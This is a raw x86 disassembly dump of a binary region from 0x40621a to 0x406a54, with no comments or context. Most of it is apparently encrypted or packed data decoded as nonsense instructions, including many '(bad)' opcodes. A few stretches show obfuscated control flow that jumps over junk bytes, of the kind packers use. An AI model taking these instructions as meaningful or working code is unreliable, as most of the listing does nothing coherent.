  40621a:	xchg   edx,eax
  40621b:	jecxz  0x406272
  40621d:	push   esi
  40621e:	add    al,0xbe
  406220:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406222:	gs retf 
  406224:	push   edx
  406225:	cmp    edi,DWORD PTR [edi-0x6c047b9e]
  40622b:	jecxz  0x4061dd
  40622d:	(bad)  
  40622e:	push   ebp
  40622f:	sub    al,0xe9
  406231:	imul   DWORD PTR [ebp-0x2cb37d29]
  406237:	xchg   ecx,eax
  406238:	int    0x5f
  40623a:	mov    DWORD PTR [ebx-0x5abaf11d],ecx
  406240:	ror    cl,0xf8
  406243:	pop    es
  406244:	dec    ebp
  406245:	ins    DWORD PTR es:[edi],dx
  406246:	aam    0x2a
  406248:	pop    es
  406249:	pmaxub mm1,QWORD PTR ds:0xfc263d51
  406250:	mov    al,0x76
  406252:	popa   
  406253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406254:	mov    edi,0xa50e9d26
  406259:	call   0x13e3c1a
  40625e:	dec    ebp
  40625f:	xor    al,0x72
  406261:	shr    DWORD PTR [esi],1
  406263:	popa   
  406264:	in     al,0x1a
  406266:	cmp    eax,0x6fe648d0
  40626b:	push   edx
  40626c:	jle    0x4062e3
  40626e:	mov    ecx,0x7e45e1e3
  406273:	xlat   BYTE PTR ds:[ebx]
  406274:	cwde   
  406275:	hlt    
  406276:	mov    ds:0x6ab589f0,eax
  40627b:	and    DWORD PTR [ecx],esi
  40627d:	dec    eax
  40627e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40627f:	ror    DWORD PTR [ebx+esi*8+0x62],cl
  406283:	scas   al,BYTE PTR es:[edi]
  406284:	js     0x4062b7
  406286:	(bad)  
  406287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406288:	mov    gs,WORD PTR [esi-0x5f760c43]
  40628e:	fimul  DWORD PTR [eax-0x3f]
  406291:	daa    
  406292:	dec    ebx
  406293:	mov    dl,0xdc
  406295:	fldl2t 
  406297:	dec    eax
  406298:	lahf   
  406299:	xchg   ebp,eax
  40629a:	mov    bl,0xf5
  40629c:	mov    ebp,0x1a222c3c
  4062a1:	aaa    
  4062a2:	mov    bl,0xad
  4062a4:	jbe    0x4062be
  4062a6:	outs   dx,DWORD PTR fs:[esi]
  4062a8:	mov    ebx,0x543841a8
  4062ad:	nop
  4062ae:	jmp    0x555a:0x955a94b5
  4062b5:	xchg   ah,bl
  4062b7:	test   al,0xa6
  4062b9:	dec    ebp
  4062ba:	stc    
  4062bb:	and    al,0x1
  4062bd:	test   eax,0x71b6e38e
  4062c2:	or     ebp,ecx
  4062c4:	popa   
  4062c5:	mov    ss,WORD PTR [esp+eiz*4-0x69294b13]
  4062cc:	cmc    
  4062cd:	xchg   BYTE PTR [esi],cl
  4062cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062d0:	adc    dl,BYTE PTR [esi+edi*1]
  4062d3:	rcr    BYTE PTR [ebp+0x219815f9],0x70
  4062da:	and    esi,edx
  4062dc:	lock mov ah,cl
  4062df:	add    edx,DWORD PTR [eax-0x45]
  4062e2:	xor    dl,dh
  4062e4:	adc    edx,ebx
  4062e6:	mov    ds:0x8bc164a4,al
  4062eb:	sub    al,0x35
  4062ed:	xchg   edx,eax
  4062ee:	dec    eax
  4062ef:	out    dx,eax
  4062f0:	or     ebx,DWORD PTR [ecx-0x45aee25e]
  4062f6:	inc    eax
  4062f7:	inc    edx
  4062f8:	sub    dh,BYTE PTR [esi]
  4062fa:	cdq    
  4062fb:	sahf   
  4062fc:	add    cl,BYTE PTR [edi]
  4062fe:	mov    dh,0xa8
  406300:	lds    edx,FWORD PTR [edx+0x6faed5e2]
  406306:	jge    0x406310
  406308:	xchg   esp,eax
  406309:	mov    DWORD PTR [esi+0x1310255a],esp
  40630f:	dec    ecx
  406310:	adc    bl,ch
  406312:	lods   eax,DWORD PTR ds:[esi]
  406313:	repnz mov ecx,DWORD PTR [ebx*2-0x52fc36b]
  40631b:	dec    esp
  40631c:	aad    0xa7
  40631e:	jae    0x4062b4
  406320:	jmp    0x406383
  406322:	scas   al,BYTE PTR es:[edi]
  406323:	jl     0x40639a
  406325:	or     DWORD PTR [ecx-0x7e01b407],ebx
  40632b:	add    DWORD PTR [ebp-0x76],0xffffff81
  40632f:	sbb    eax,0xdcd9a6ab
  406334:	mov    eax,ecx
  406336:	imul   ebx,DWORD PTR ds:0x1bf2f0fb,0x59
  40633d:	repnz mov edi,0x2eed43c
  406343:	ds aam 0x56
  406346:	add    al,0x46
  406348:	scas   ax,WORD PTR es:[edi]
  40634a:	push   edx
  40634b:	aad    0xeb
  40634d:	sub    al,0xde
  40634f:	scas   eax,DWORD PTR es:[edi]
  406350:	in     eax,dx
  406351:	in     al,dx
  406352:	fild   DWORD PTR [edi]
  406354:	shl    cl,cl
  406356:	push   esi
  406357:	jmp    0x4063c9
  406359:	pop    esi
  40635a:	push   ecx
  40635b:	mov    BYTE PTR [ecx-0x8469ade],cl
  406361:	sub    DWORD PTR [ecx],0x68
  406364:	and    al,0xcd
  406366:	int3   
  406367:	dec    edx
  406368:	and    bl,ch
  40636a:	push   ebp
  40636b:	mov    ebp,0xb3508a6d
  406370:	cmp    bh,0xa1
  406373:	dec    eax
  406374:	shl    DWORD PTR [eax-0x2d3943f1],0xbb
  40637b:	hlt    
  40637c:	push   ecx
  40637d:	das    
  40637e:	out    0x7e,eax
  406380:	out    dx,al
  406381:	xor    al,0x27
  406383:	xlat   BYTE PTR ds:[ebx]
  406384:	sub    ebx,DWORD PTR [esi]
  406386:	iret   
  406387:	fcmovbe st,st(2)
  406389:	sbb    ebp,DWORD PTR [edx]
  40638b:	mov    DWORD PTR [edi+0x11],edx
  40638e:	bound  eax,QWORD PTR [ebx-0x51]
  406391:	(bad)  
  406392:	jno    0x40634f
  406394:	mov    ds:0x2ae51a57,eax
  406399:	or     al,0x78
  40639b:	cs xor bl,bh
  40639e:	cmp    dl,BYTE PTR [edx-0x51ebb861]
  4063a4:	cmp    BYTE PTR [ecx-0x80],ah
  4063a7:	adc    edx,eax
  4063a9:	imul   ebx,DWORD PTR [eax],0x58988b40
  4063af:	lods   eax,DWORD PTR ds:[esi]
  4063b0:	and    ecx,DWORD PTR [esi]
  4063b2:	or     al,0xf9
  4063b4:	(bad)  
  4063b5:	stos   BYTE PTR es:[edi],al
  4063b6:	and    DWORD PTR [ecx-0x37f83b13],edx
  4063bc:	mov    cl,BYTE PTR [si+0x4073]
  4063c1:	shr    DWORD PTR [eax],1
  4063c3:	aam    0xee
  4063c5:	or     DWORD PTR [esi+esi*1+0x480851dc],edx
  4063cc:	sbb    DWORD PTR [ebx],edi
  4063ce:	pop    esi
  4063cf:	(bad)  
  4063d0:	cmp    DWORD PTR [edi-0x28cee369],esp
  4063d6:	pop    ebx
  4063d7:	mov    ecx,ds
  4063d9:	cmp    al,0xa9
  4063db:	sub    BYTE PTR [eax+ebx*1-0x13d78cd5],ch
  4063e2:	dec    ebx
  4063e3:	adc    eax,0xa8f2fc92
  4063e8:	lea    esi,[ecx+ebx*8-0x2b]
  4063ec:	mov    cl,BYTE PTR [ecx+ecx*8]
  4063ef:	xor    dl,BYTE PTR [ecx+0x55724c07]
  4063f5:	adc    esi,DWORD PTR [ebp-0x2d2dc98b]
  4063fb:	mov    BYTE PTR [esi-0x41ac79b3],0x9f
  406402:	jne    0x40647e
  406404:	call   0xcffc:0x84ba136
  40640b:	and    ebp,DWORD PTR [eax-0xd0d7389]
  406411:	pop    ss
  406412:	xlat   BYTE PTR ds:[ebx]
  406413:	dec    esi
  406414:	(bad)
  406418:	cmp    esp,ebp
  40641a:	sbb    BYTE PTR [ecx+0x37],0x29
  40641e:	fwait
  40641f:	cmc    
  406420:	mov    eax,ds:0xf7ff860f
  406425:	(bad)  
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430606,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e8e2
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430612
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x430632,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ef8c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e8e2,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e8da
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8+0x1be4a3d7]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	mov    BYTE PTR [eax],bl
  4064af:	mov    ah,BYTE PTR [ebx+0x2b]
  4064b2:	sahf   
  4064b3:	pop    ds
  4064b4:	clc    
  4064b5:	test   BYTE PTR [ecx+ebp*1+0x11bd19f0],ah
  4064bc:	fld    DWORD PTR [edi]
  4064be:	test   eax,0xde754d28
  4064c3:	sti    
  4064c4:	shr    edi,1
  4064c6:	pop    esi
  4064c7:	mov    edi,esp
  4064c9:	in     eax,0xc0
  4064cb:	lock mov edi,0xd2a24f15
  4064d1:	fsub   st(4),st
  4064d3:	inc    esp
  4064d4:	dec    ebx
  4064d5:	xor    al,0xfe
  4064d7:	xchg   ebx,eax
  4064d8:	and    dl,BYTE PTR ds:0xda252cd0
  4064de:	add    eax,0xfdad5720
  4064e3:	jo     0x40653e
  4064e5:	jo     0x406497
  4064e7:	push   edx
  4064e8:	jmp    0x6f8c0912
  4064ed:	inc    BYTE PTR [edi-0x13]
  4064f0:	push   ebx
  4064f1:	inc    esp
  4064f2:	and    BYTE PTR [eax-0x4e],dh
  4064f5:	sbb    al,0x39
  4064f7:	inc    esp
  4064f8:	pop    edx
  4064f9:	cmp    DWORD PTR [edx],ecx
  4064fb:	in     eax,dx
  4064fc:	inc    ebx
  4064fd:	mov    ds:0xddd067e7,eax
  406502:	mov    bl,0x4b
  406504:	shl    BYTE PTR [ecx+esi*8+0x843a27d],1
  40650b:	sbb    DWORD PTR [eax],esp
  40650d:	push   edi
  40650e:	(bad)  
  40650f:	arpl   WORD PTR [ebx],cx
  406511:	dec    edi
  406512:	fwait
  406513:	add    DWORD PTR [ecx],edx
  406515:	adc    BYTE PTR [ecx+0x16],dh
  406518:	call   0x9d36:0x19cdef05
  40651f:	inc    esp
  406520:	pop    ecx
  406521:	pop    ds
  406522:	ss enter 0x997c,0x47
  406527:	ror    BYTE PTR [ecx+0x7b],cl
  40652a:	mov    dh,0x28
  40652c:	(bad)  
  40652d:	(bad)  
  40652e:	jae    0x4064fe
  406530:	xchg   DWORD PTR [edi+0x26ef2170],ecx
  406536:	imul   edi
  406538:	leave  
  406539:	(bad)  
  40653a:	xchg   edx,eax
  40653b:	mov    ch,0xfd
  40653d:	ret    0x3372
  406540:	add    BYTE PTR [esi-0x46],bl
  406543:	add    ebx,DWORD PTR [edi]
  406545:	push   edi
  406546:	dec    eax
  406547:	dec    edi
  406548:	mov    DWORD PTR [eax+edx*8+0x57],ebp
  40654c:	xchg   ebp,eax
  40654d:	bound  esp,QWORD PTR [ebx+0x7b]
  406550:	(bad)  
  406551:	popa   
  406552:	or     esi,DWORD PTR [esp+eiz*4-0x42d71a2c]
  406559:	mov    ebp,DWORD PTR [esi-0x7cec0f1]
  40655f:	(bad)  
  406560:	fild   QWORD PTR [esi-0x2977c132]
  406566:	xlat   BYTE PTR ds:[ebx]
  406567:	test   al,0xf6
  406569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40656a:	in     al,0xf9
  40656c:	or     eax,ebx
  40656e:	(bad)  [esi]
  406570:	sub    al,0x74
  406572:	cmp    al,0x73
  406574:	data16 sbb ch,BYTE PTR [ebx]
  406577:	cmc    
  406578:	fwait
  406579:	add    ah,BYTE PTR fs:[ebx+esi*4]
  40657d:	cmp    cl,bl
  40657f:	add    eax,0x3e62a99f
  406584:	and    ebx,DWORD PTR [ebx]
  406586:	icebp  
  406587:	mov    edx,DWORD PTR [ebp+0x593fa0da]
  40658d:	mov    eax,DWORD PTR [esi+ebp*8]
  406590:	and    BYTE PTR [edi+edi*1+0x40e049ef],0xdf
  406598:	stos   BYTE PTR es:[edi],al
  406599:	stc    
  40659a:	js     0x40660d
  40659c:	in     eax,dx
  40659d:	mov    ecx,0x707e8957
  4065a2:	mov    dl,0x3a
  4065a4:	sbb    eax,0x30b585b7
  4065a9:	push   ecx
  4065aa:	push   es
  4065ab:	mov    edi,0x9ca72e0a
  4065b0:	cmp    BYTE PTR [esp+eax*4+0x4f97c541],dh
  4065b7:	out    0xf,al
  4065b9:	add    DWORD PTR [eax-0x2a],edi
  4065bc:	cli    
  4065bd:	jb     0x40654a
  4065bf:	(bad)  
  4065c0:	retf   0x36a6
  4065c3:	(bad)  
  4065c4:	cmp    eax,0xd9fe8a50
  4065c9:	enter  0x1510,0xdc
  4065cd:	mov    al,ds:0x22cacebc
  4065d2:	mov    al,ds:0x10209fac
  4065d7:	xor    eax,0xe7e99845
  4065dc:	mov    ebp,0xd3822cc8
  4065e1:	sbb    DWORD PTR [esi+eiz*1],esi
  4065e4:	pop    esp
  4065e5:	jo     0x4065c0
  4065e7:	or     DWORD PTR [ebp-0x29],edi
  4065ea:	mov    eax,0xedc22607
  4065ef:	add    al,0xfa
  4065f1:	in     eax,0x9b
  4065f3:	not    DWORD PTR [ebx+0x77]
  4065f6:	pop    ss
  4065f7:	pop    ds
  4065f8:	test   DWORD PTR [edi],0x358478d8
  4065fe:	fwait
  4065ff:	loope  0x406649
  406601:	inc    esp
  406602:	pop    edi
  406603:	mov    edi,DWORD PTR [ecx+ebx*8+0x7d05ff84]
  40660a:	adc    al,dl
  40660c:	ds inc edx
  40660e:	fldz   
  406610:	lds    ebp,FWORD PTR [esi]
  406612:	retf   
  406613:	jg     0x4065b7
  406615:	sbb    eax,0xd2038a3d
  40661a:	lea    ebp,[edi-0x5e4b8706]
  406620:	jae    0x4065b6
  406622:	je     0x406664
  406624:	pop    ds
  406625:	ss cdq 
  406627:	mov    al,ds:0xba491c04
  40662c:	dec    edi
  40662d:	inc    esp
  40662e:	sub    BYTE PTR [ebx],0xe8
  406631:	sbb    ebp,esi
  406633:	pop    ss
  406634:	(bad)  
  406635:	out    0x5,eax
  406637:	jne    0x40662a
  406639:	dec    ebp
  40663a:	in     al,0xdb
  40663c:	ja     0x406628
  40663e:	scas   eax,DWORD PTR es:[edi]
  40663f:	scas   eax,DWORD PTR es:[edi]
  406640:	mov    eax,ds:0x41ca5b7f
  406645:	das    
  406646:	or     DWORD PTR [eax-0x39],esp
  406649:	push   edx
  40664a:	xchg   DWORD PTR [ebx-0x36d75104],edx
  406650:	(bad)  
  406651:	pop    edx
  406652:	adc    bl,dl
  406654:	lock aaa 
  406656:	mov    esi,0xcf5e82f8
  40665c:	xor    DWORD PTR [eax+eiz*1+0x4c],esp
  406660:	push   ss
  406661:	sub    DWORD PTR [ebx+0xe],0xb5ce6c2a
  406668:	push   ss
  406669:	xor    BYTE PTR [ebx-0x51],bh
  40666c:	mov    ds:0xa8aa72c2,al
  406671:	xor    eax,0xb6945b5b
  406676:	(bad)  
  406677:	stc    
  406678:	ror    DWORD PTR [edx-0x50],cl
  40667b:	adc    ebx,ebx
  40667d:	add    DWORD PTR [edx+ebp*1+0x3cdb2c27],edx
  406684:	push   ss
  406685:	and    BYTE PTR [edx+ebp*1+0x11],cl
  406689:	jg     0x406643
  40668b:	mov    esp,0xf4065558
  406690:	imul   edx,ecx,0x6a704828
  406696:	mov    dl,0x6f
  406698:	mov    ds:0x7b8798cc,al
  40669d:	sub    eax,0x4ec2bc1f
  4066a2:	inc    eax
  4066a3:	jecxz  0x406633
  4066a5:	hlt    
  4066a6:	or     dl,BYTE PTR [edx-0x7e]
  4066a9:	pop    esi
  4066aa:	ret    0xfa53
  4066ad:	pop    esp
  4066ae:	out    dx,al
  4066af:	fstp   QWORD PTR [eax+0xa22072c]
  4066b5:	ins    BYTE PTR es:[edi],dx
  4066b6:	pop    ds
  4066b7:	int    0x37
  4066b9:	out    0xf4,al
  4066bb:	popf   
  4066bc:	js     0x406697
  4066be:	and    eax,0xbb42d2a8
  4066c3:	shl    DWORD PTR [esi-0x6],0x8c
  4066c7:	lahf   
  4066c8:	ret    0xd6f9
  4066cb:	or     al,0x7f
  4066cd:	sub    dl,BYTE PTR [edi-0x580d2eab]
  4066d3:	neg    esp
  4066d5:	inc    edi
  4066d6:	jbe    0x406698
  4066d8:	jmp    0xed722f1f
  4066dd:	sbb    edx,DWORD PTR [ebx]
  4066df:	and    BYTE PTR [esi-0x3c93bbc4],dh
  4066e5:	loope  0x406677
  4066e7:	adc    ebp,DWORD PTR [ebx]
  4066e9:	pop    ecx
  4066ea:	push   cs
  4066eb:	jp     0x4066ef
  4066ed:	mov    dh,0x51
  4066ef:	add    eax,DWORD PTR [edx]
  4066f1:	xchg   esi,eax
  4066f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066f3:	mov    eax,DWORD PTR [ebp-0x68d68990]
  4066f9:	mov    al,ds:0x4c8d234c
  4066fe:	mov    bl,0x46
  406700:	adc    BYTE PTR [esi],al
  406702:	mov    ch,0x86
  406704:	sbb    al,BYTE PTR [ebx+0x4b]
  406707:	aam    0x4a
  406709:	mov    BYTE PTR [edx-0x55a83c7a],bl
  40670f:	jns    0x406715
  406711:	sub    eax,0xb6832a8
  406716:	adc    cl,BYTE PTR [ebp+0x33]
  406719:	push   edx
  40671a:	mov    ecx,0xc0cb4e3f
  40671f:	push   es
  406720:	push   0xfe81b923
  406725:	dec    edi
  406726:	bound  edi,QWORD PTR [edi+0x5a]
  406729:	pop    ebp
  40672a:	jmp    0x4066c7
  40672c:	sahf   
  40672d:	push   ds
  40672e:	inc    edx
  40672f:	add    eax,0x2e0342d9
  406734:	add    ch,BYTE PTR [ecx-0x53dbd950]
  40673a:	push   ecx
  40673b:	jno    0x40678c
  40673d:	fild   QWORD PTR [edx+ebp*8-0x299841b3]
  406744:	scas   eax,DWORD PTR es:[edi]
  406745:	fiadd  WORD PTR [edx-0x4d]
  406748:	lods   al,BYTE PTR ds:[esi]
  406749:	popf   
  40674a:	cmc    
  40674b:	mov    esi,ebx
  40674d:	xor    al,0xda
  40674f:	mov    DWORD PTR [eax+eiz*1-0x31],esp
  406753:	mov    bh,cl
  406755:	sbb    DWORD PTR [esi+ebp*8],ecx
  406758:	or     eax,0x11f89d4
  40675d:	xor    DWORD PTR [eax-0x12],edi
  406760:	jmp    0x141c:0xb6fa9f22
  406767:	js     0x406761
  406769:	push   ss
  40676a:	aas    
  40676b:	push   ss
  40676c:	dec    ebp
  40676d:	sub    al,0xad
  40676f:	bnd jmp 0x615dbce
  406775:	into   
  406776:	push   eax
  406777:	imul   edi,ecx,0xe8ac84fe
  40677d:	jmp    0x594133d1
  406782:	rol    DWORD PTR [edx-0x41],1
  406785:	pop    eax
  406786:	stc    
  406787:	adc    DWORD PTR [eax+esi*2+0x78],0x4
  40678c:	arpl   WORD PTR [ebx+ebx*4-0x10c250eb],si
  406793:	mov    ecx,0xeb39e554
  406798:	inc    ebp
  406799:	lods   al,BYTE PTR ds:[esi]
  40679a:	jns    0x4067df
  40679c:	or     BYTE PTR [ecx+esi*4],dl
  40679f:	add    al,0x35
  4067a1:	cmc    
  4067a2:	fucomp st(7)
  4067a4:	push   ds
  4067a5:	mov    ebx,0x2ecbfa81
  4067aa:	aaa    
  4067ab:	mov    ch,0x59
  4067ad:	pop    ebx
  4067ae:	pop    ds
  4067af:	inc    esi
  4067b0:	or     eax,DWORD PTR [ebx+0x4c6c4fac]
  4067b6:	xor    DWORD PTR [esi],ebp
  4067b8:	imul   eax,DWORD PTR [eax-0x17ce7dbd],0x2ac9e4cd
  4067c2:	xchg   ecx,eax
  4067c3:	adc    DWORD PTR [edi],eax
  4067c5:	add    al,BYTE PTR [edi+0x15413e1]
  4067cb:	leave  
  4067cc:	dec    ebx
  4067cd:	sbb    BYTE PTR [esp+ecx*8-0x15382aa3],al
  4067d4:	leave  
  4067d5:	outs   dx,DWORD PTR ds:[esi]
  4067d6:	adc    DWORD PTR [eax],eax
  4067d8:	pop    ss
  4067d9:	pop    esp
  4067da:	sub    DWORD PTR [ecx-0x3d29606b],esi
  4067e0:	adc    esi,DWORD PTR ds:0xf199640b
  4067e6:	mov    cl,0x7d
  4067e8:	(bad)  
  4067e9:	dec    edi
  4067ea:	or     cl,0x94
  4067ed:	hlt    
  4067ee:	mov    ecx,0xe58766de
  4067f3:	dec    esi
  4067f4:	out    dx,al
  4067f5:	gs pop edi
  4067f7:	xor    BYTE PTR [esp+esi*4+0x66c7569d],dh
  4067fe:	and    ecx,edi
  406800:	pop    eax
  406801:	out    0xb1,al
  406803:	adc    DWORD PTR [edi+ebx*2-0x28],edi
  406807:	push   ss
  406808:	inc    edi
  406809:	loopne 0x40686d
  40680b:	and    BYTE PTR [esi-0x48],0xda
  40680f:	mov    eax,0x776ba087
  406814:	push   esp
  406815:	jb     0x4067b9
  406817:	or     BYTE PTR [esp+edi*4],cl
  40681a:	mov    esi,DWORD PTR [ebp+0xc]
  40681d:	sbb    DWORD PTR ds:0x42efa4,0x43062a
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x4306d2,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ef9c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x4306be
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x43063a,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x4306d6,0x43061a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42efa4,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	inc    ebx
  406894:	sub    edi,DWORD PTR [ebx-0x61]
  406897:	dec    ebx
  406898:	ss jle 0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	sbb    eax,ebp
  4068a1:	jo     0x406895
  4068a3:	loop   0x4068e6
  4068a5:	add    esp,edx
  4068a7:	aaa    
  4068a8:	push   0x73
  4068aa:	jo     0x4068de
  4068ac:	ds dec esi
  4068ae:	(bad)  
  4068b0:	push   cs
  4068b1:	inc    eax
  4068b2:	mov    eax,ds:0xa06bbc91
  4068b7:	cmp    BYTE PTR [ebp+0x0],cl
  4068ba:	mov    ds:0x503fc066,eax
  4068bf:	jae    0x406878
  4068c1:	mov    BYTE PTR [ecx],cl
  4068c3:	xor    DWORD PTR [eax+0x6f],edx
  4068c6:	pop    ebp
  4068c7:	hlt    
  4068c8:	mov    BYTE PTR [ecx-0x1ce19277],0xf0
  4068cf:	sbb    al,0x31
  4068d1:	pop    ss
  4068d2:	push   ds
  4068d3:	lock inc esp
  4068d5:	xor    dl,BYTE PTR [ebx+0x5c2fe18f]
  4068db:	fst    DWORD PTR [edi+0x74541794]
  4068e1:	(bad)  
  4068e2:	sub    eax,0xa00d1587
  4068e7:	out    dx,eax
  4068e8:	mov    dl,0xfb
  4068ea:	push   ds
  4068eb:	cmp    dl,ah
  4068ed:	xchg   esi,eax
  4068ee:	cs mov edi,0xdc20dc99
  4068f4:	xchg   esp,eax
  4068f5:	outs   dx,DWORD PTR ds:[esi]
  4068f6:	xchg   BYTE PTR [edx],dl
  4068f8:	repz dec esi
  4068fa:	fld    QWORD PTR [ebp-0x14ea626b]
  406900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406901:	idiv   DWORD PTR [eax]
  406903:	jl     0x4068f1
  406905:	mov    ebp,0x47483f34
  40690a:	xchg   ebp,eax
  40690b:	lods   al,BYTE PTR ds:[esi]
  40690c:	jnp    0x406895
  40690e:	loopne 0x4068be
  406910:	aad    0xd0
  406912:	xchg   ebx,eax
  406913:	push   esi
  406914:	out    dx,al
  406915:	mov    WORD PTR [esi],?
  406917:	xchg   DWORD PTR [ebx-0x24],edx
  40691a:	push   eax
  40691b:	pop    esp
  40691c:	mov    eax,ds:0x431367b7
  406921:	fadd   st,st(6)
  406923:	addr16 int3 
  406925:	aam    0xbd
  406927:	sub    edx,ebp
  406929:	xlat   BYTE PTR ds:[ebx]
  40692a:	leave  
  40692b:	and    bh,dh
  40692d:	mul    DWORD PTR [eax-0xc]
  406930:	dec    ebx
  406931:	shl    DWORD PTR cs:[edi-0x65],1
  406935:	xor    ah,BYTE PTR [esi-0x28]
  406938:	mov    ds:0x80c3ce73,al
  40693d:	and    edi,eax
  40693f:	clc    
  406940:	sub    al,bh
  406942:	in     eax,dx
  406943:	mov    ebp,0xb80a6313
  406948:	pop    ebx
  406949:	mov    WORD PTR [eax+0x3e],cs
  40694c:	lahf   
  40694d:	and    cl,ah
  40694f:	jmp    0xedab:0x6421b600
  406956:	rol    BYTE PTR [esi],1
  406958:	jl     0x406986
  40695a:	add    al,0x72
  40695c:	add    DWORD PTR [ecx],ecx
  40695e:	sub    DWORD PTR [ebp-0x4c],0xffffff97
  406962:	scas   eax,DWORD PTR es:[edi]
  406963:	mov    eax,0x1312e732
  406968:	mov    WORD PTR [esi-0x4c6fd47c],ds
  40696e:	mov    bl,0x54
  406970:	push   0xffffffbb
  406972:	or     ebp,ecx
  406974:	mov    esp,0x5d7fe27e
  406979:	fisub  DWORD PTR [eax-0xfdf5f09]
  40697f:	aam    0xb6
  406981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406982:	stc    
  406983:	cli    
  406984:	xlat   BYTE PTR ds:[ebx]
  406985:	test   al,0x75
  406987:	(bad)  
  406988:	pop    ebx
  406989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40698a:	fs aad 0x9f
  40698d:	xchg   esi,eax
  40698e:	imul   esi,DWORD PTR [edx],0xffffffd9
  406991:	(bad)  
  406992:	fisubr DWORD PTR [ebx+0x6b]
  406995:	fisttp DWORD PTR [edi+0x7c]
  406998:	rcr    DWORD PTR [eax],0x18
  40699b:	aam    0x72
  40699d:	icebp  
  40699e:	aaa    
  40699f:	mov    bh,0xd7
  4069a1:	fmul   DWORD PTR [edx+ebp*2-0x653a41eb]
  4069a8:	ss adc al,0x6b
  4069ab:	and    edi,edx
  4069ad:	outs   dx,BYTE PTR ds:[esi]
  4069ae:	movups xmm5,XMMWORD PTR [eax+0x78b6f4aa]
  4069b5:	pop    ds
  4069b6:	jmp    0x4069f4
  4069b8:	es push eax
  4069ba:	(bad)  [eax+0xf]
  4069bd:	dec    ecx
  4069be:	in     al,dx
  4069bf:	ror    DWORD PTR [ecx+0x72],1
  4069c2:	pop    ss
  4069c3:	ficomp WORD PTR [ecx]
  4069c5:	sbb    al,0xda
  4069c7:	sahf   
  4069c8:	out    dx,eax
  4069c9:	jnp    0x4069f2
  4069cb:	mov    ch,0x4f
  4069cd:	(bad)  [ecx+eax*2]
  4069d0:	push   sp
  4069d2:	imul   eax,DWORD PTR [esi],0xffffff91
  4069d5:	push   esp
  4069d6:	retf   0x57b9
  4069d9:	pop    esi
  4069da:	sbb    edx,DWORD PTR [eax+0x6b]
  4069dd:	ins    DWORD PTR es:[edi],dx
  4069de:	enter  0x63dc,0x7e
  4069e2:	pop    ecx
  4069e3:	icebp  
  4069e4:	(bad)  
  4069e5:	mov    ds,WORD PTR [edi+ebp*2+0x5b]
  4069e9:	cli    
  4069ea:	mov    edx,DWORD PTR fs:[edx-0x68]
  4069ee:	push   ebx
  4069ef:	mov    ebp,0x7595198e
  4069f4:	xor    ch,BYTE PTR [ecx+eax*8]
  4069f7:	loopne 0x406a60
  4069f9:	xchg   ebp,eax
  4069fa:	jmp    0xa1bd:0x9e861679
  406a01:	inc    esi
  406a02:	mov    ds:0x73ca80f0,eax
  406a07:	pop    esp
  406a08:	push   es
  406a09:	imul   edi,DWORD PTR [ecx+0x68],0xffffffbd
  406a0d:	arpl   si,dx
  406a0f:	jmp    0xf2c5:0x72e909f2
  406a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a17:	mov    esp,0x6b0642b9
  406a1c:	mov    ebp,0xf58ae295
  406a21:	cmc    
  406a22:	fstp   QWORD PTR es:[edi+ebx*1+0x41]
  406a27:	aam    0x27
  406a29:	mov    edi,0x33d76314
  406a2e:	add    BYTE PTR [eax],0x75
  406a31:	retf   0x57ca
  406a34:	jecxz  0x4069e5
  406a36:	(bad)  
  406a38:	sbb    al,0xc1
  406a3a:	dec    ebx
  406a3b:	add    eax,0x84389aff
  406a40:	jmp    0x3a1b:0x2b61bb64
  406a47:	test   eax,0xcf43f4b0
  406a4c:	dec    ebx
  406a4d:	xlat   BYTE PTR ds:[ebx]
  406a4e:	xchg   edi,eax
  406a4f:	mov    ds:0x1a94da6,eax
  406a54:	xchg   esp,eax
